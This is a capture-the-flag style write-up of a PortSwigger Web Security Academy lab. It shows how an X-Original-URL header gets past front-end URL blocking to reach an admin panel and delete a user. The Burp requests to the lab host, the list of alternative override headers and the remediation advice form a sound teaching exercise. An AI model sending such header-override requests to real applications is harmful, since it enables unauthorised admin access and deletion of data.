# Lab 10: URL-Based Access Control Can Be Circumvented

**Category:** Access Control Vulnerabilities
**Difficulty:** Practitioner
**Lab link:** [URL-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented)

## Overview

The front-end blocks `/admin` based on the URL path, returning 403. However, the back-end framework honours the `X-Original-URL` header to determine the actual path to process. By sending `GET /` with `X-Original-URL: /admin`, the front-end sees a benign path and passes the request; the back-end processes the admin path.

## Key Concepts

- **URL-based access control at the front-end:** the proxy/WAF checks the request URL path and blocks certain paths. This check is bypassed if the back-end can be told to process a different path.
- **`X-Original-URL` / `X-Rewrite-URL` headers:** supported by some frameworks (e.g. Symfony, Django with certain middleware) to let reverse proxies communicate the original URL after rewriting. If the back-end trusts these headers, an attacker can override the path.
- **Split enforcement:** any time access control logic lives only in a front-end layer and the back-end has a secondary path-resolution mechanism, the two can be split apart.

## Solution

### Step 1 — Confirm the block

Browse to `/admin` — 403 Forbidden returned by the front-end.

### Step 2 — Bypass with X-Original-URL

In Burp Repeater:
```
GET / HTTP/1.1
Host: LAB-ID.web-security-academy.net
X-Original-URL: /admin
```

The admin panel renders — front-end checked `/` (allowed), back-end processed `/admin`.

### Step 3 — Delete carlos

Query string parameters go on the outer URL; the path override stays in the header:
```
GET /?username=carlos HTTP/1.1
Host: LAB-ID.web-security-academy.net
X-Original-URL: /admin/delete
```

Lab solved.

## How It Works

```
Client → Front-end (WAF/proxy)
  Sees: GET /               → allowed
  Forwards to back-end with X-Original-URL: /admin

Back-end framework
  Reads X-Original-URL header → routes request to /admin handler
  No access check at back-end level
```

The access control lives entirely in the front-end URL check. The back-end trusts the header without its own authorization check.

## Other Headers to Try

- `X-Original-URL`
- `X-Rewrite-URL`
- `X-Forwarded-URL`
- `X-Override-URL`

Different frameworks and middleware support different header names.

## Remediation

- Enforce access control at the **back-end**, not only at the front-end/proxy layer.
- Disable or ignore `X-Original-URL` / `X-Rewrite-URL` headers unless the back-end explicitly needs them and they come from a trusted internal source.
- Defence in depth: even if the proxy checks the URL, the application should re-verify authorization on every request.

## Python Script

[solve.py on GitHub](https://github.com/codingvedant/burpsuite-academy-labs/blob/main/access-control/lab-10-url-based-bypass/solve.py)

Sends `GET /` with `X-Original-URL: /admin/delete` and `?username=carlos` to delete carlos.

## Key Takeaways

- Front-end-only access control is bypassable whenever the back-end has an alternative path-resolution mechanism.
- `X-Original-URL` is the standard bypass for Symfony/similar stacks; always test it when a URL-based block is in play.
- Access control must be enforced where the business logic lives — the back-end application.
